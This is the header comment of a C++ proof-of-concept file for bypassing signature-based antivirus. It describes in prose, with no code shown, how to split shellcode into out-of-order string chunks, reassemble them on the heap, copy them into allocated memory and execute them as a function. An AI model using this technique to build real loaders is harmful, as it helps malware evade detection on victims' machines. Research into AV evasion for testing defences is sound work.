 * Author: 	Jake Homberg
 * File: 	AVBypass_Skeletonized.cpp
 * Date: 	1/30/2018
 *
 * Purpose: 	This file is a proof of concept to test a method of bypassing signature
 * 		based anti-virus. This method involves storing the shellcode that would
 * 		normally trigger the virus/malware definition when stored as one
 * 		contiguous string of bytes. 
 * 		
 * 		If the byte string to be executed is written as string [VAR NAME] = 
 * 		'[Complete shellcode]' and the source code is compiled, the shellcode 
 * 		will be stored in a section of the PE such as the .data section as 
 * 		defined. This will trigger an AV detection.
 * 		
 * 		If the byte string to be executed is chunked and stored as multiple
 * 		smaller strings out of order, it will store them as such in the .data or
 * 		a similar section. Because the bytes are out of order, we can say that
 * 		we may break up the 'signature' that the AV systems search for.
 *
 * 		To fix the buffer, a char array of sufficient size is created and the 
 * 		program will loop through the array of string pointers to strcpy the 
 * 		value of the string found at each pointer in the array.
 *
 * 		Once the buffer has been reassembled on the heap, we take it and pass 
 * 		it to the runShellcode() function as a part of a pair. The pair
 * 		consists of the char pointer and the int that gives the size of the
 * 		reassembled shellcode. It will allocate a space in memory and do a 
 * 		memcpy from the char* to the newly made space. It will then call the 
 * 		shellcode as a function to execute it.
